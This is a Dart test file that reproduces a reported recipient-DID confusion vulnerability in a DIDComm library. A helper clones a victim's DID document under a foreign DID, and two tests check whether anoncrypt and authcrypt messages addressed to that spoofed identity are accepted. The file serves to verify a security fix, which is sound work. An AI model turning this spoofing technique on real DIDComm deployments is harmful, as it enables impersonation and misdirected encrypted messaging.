import 'package:didcomm/didcomm.dart';
import 'package:ssi/ssi.dart';
import 'package:test/test.dart';

/// Reported original proof of concept — demonstrates the vulnerability.
///
/// These tests reproduce the recipient DID confusion attack. Before the fix,
/// both tests PASSED (the victim accepted messages addressed to a foreign DID).
/// After the fix, both tests FAIL — confirming the vulnerability is closed.
void main() {
  group('recipient DID confusion proof of concept', () {
    test('anoncrypt accepts a did:peer recipient as did:example when the key fragment matches', () async {
      final victim = await _createDidPeerRecipient();
      final fakeRecipientDidDocument = _cloneWithForeignDid(
        victim.didDocument,
        foreignDid: 'did:example:mallory',
      );
      final plaintext = PlainTextMessage(
        id: 'anoncrypt-poc',
        type: Uri.parse('https://didcomm.org/test/1.0/msg'),
        to: [fakeRecipientDidDocument.id],
        body: {'content': 'cross-did anoncrypt delivery'},
      );

      final encrypted = await DidcommMessage.packIntoEncryptedMessage(
        plaintext,
        keyType: KeyType.p256,
        recipientDidDocuments: [fakeRecipientDidDocument],
        keyWrappingAlgorithm: KeyWrappingAlgorithm.ecdhEs,
        encryptionAlgorithm: EncryptionAlgorithm.a256cbc,
      );

      final unpacked = await DidcommMessage.unpackToPlainTextMessage(
        message: encrypted.toJson(),
        recipientDidManager: victim.didManager,
        expectedMessageWrappingTypes: [MessageWrappingType.anoncryptPlaintext],
      );

      expect(victim.didDocument.id, isNot(fakeRecipientDidDocument.id));
      expect(encrypted.recipients.single.header.keyId, 'did:example:mallory#key-2');
      expect(unpacked.to, [fakeRecipientDidDocument.id]);
      expect(unpacked.body?['content'], 'cross-did anoncrypt delivery');
    });

    test('authcrypt accepts a did:peer recipient as did:example when the key fragment matches', () async {
      final victim = await _createDidPeerRecipient();
      final fakeRecipientDidDocument = _cloneWithForeignDid(
        victim.didDocument,
        foreignDid: 'did:example:mallory',
      );
      final sender = await _createDidKeySender();

      final plaintext = PlainTextMessage(
        id: 'authcrypt-poc',
        type: Uri.parse('https://didcomm.org/test/1.0/msg'),
        from: sender.didDocument.id,
        to: [fakeRecipientDidDocument.id],
        body: {'content': 'cross-did authcrypt delivery'},
      );

      final encrypted = await DidcommMessage.packIntoEncryptedMessage(
        plaintext,
        keyPair: sender.keyPair,
        didKeyId: sender.didDocument.keyAgreement.first.didKeyId,
        recipientDidDocuments: [fakeRecipientDidDocument],
        keyWrappingAlgorithm: KeyWrappingAlgorithm.ecdh1Pu,
        encryptionAlgorithm: EncryptionAlgorithm.a256cbc,
      );

      final unpacked = await DidcommMessage.unpackToPlainTextMessage(
        message: encrypted.toJson(),
        recipientDidManager: victim.didManager,
        expectedMessageWrappingTypes: [MessageWrappingType.authcryptPlaintext],
      );

      expect(victim.didDocument.id, isNot(fakeRecipientDidDocument.id));
      expect(encrypted.recipients.single.header.keyId, 'did:example:mallory#key-2');
      expect(unpacked.to, [fakeRecipientDidDocument.id]);
      expect(unpacked.from, sender.didDocument.id);
      expect(unpacked.body?['content'], 'cross-did authcrypt delivery');
    });
  });
}

Future<({DidDocument didDocument, DidPeerManager didManager})>
    _createDidPeerRecipient() async {
  final wallet = PersistentWallet(InMemoryKeyStore());
  final didManager = DidPeerManager(
    wallet: wallet,
    store: InMemoryDidStore(),
  );

  await wallet.generateKey(
    keyId: 'victim-p256',
    keyType: KeyType.p256,
  );
  await didManager.addVerificationMethod('victim-p256');

  return (
    didDocument: await didManager.getDidDocument(),
    didManager: didManager,
  );
}

Future<({DidDocument didDocument, DidKeyManager didManager, KeyPair keyPair})>
    _createDidKeySender() async {
  final wallet = PersistentWallet(InMemoryKeyStore());
  final didManager = DidKeyManager(
    wallet: wallet,
    store: InMemoryDidStore(),
  );
  final keyPair = await wallet.generateKey(
    keyId: 'sender-p256',
    keyType: KeyType.p256,
  );
  await didManager.addVerificationMethod('sender-p256');

  return (
    didDocument: await didManager.getDidDocument(),
    didManager: didManager,
    keyPair: keyPair,
  );
}

DidDocument _cloneWithForeignDid(
  DidDocument didDocument, {
  required String foreignDid,
}) {
  final json = Map<String, dynamic>.from(didDocument.toJson());
  json['id'] = foreignDid;

  final verificationMethods =
      (json['verificationMethod'] as List).cast<Map<String, dynamic>>();

  for (final verificationMethod in verificationMethods) {
    verificationMethod['controller'] = foreignDid;
  }

  return DidDocument.fromJson(json);
}
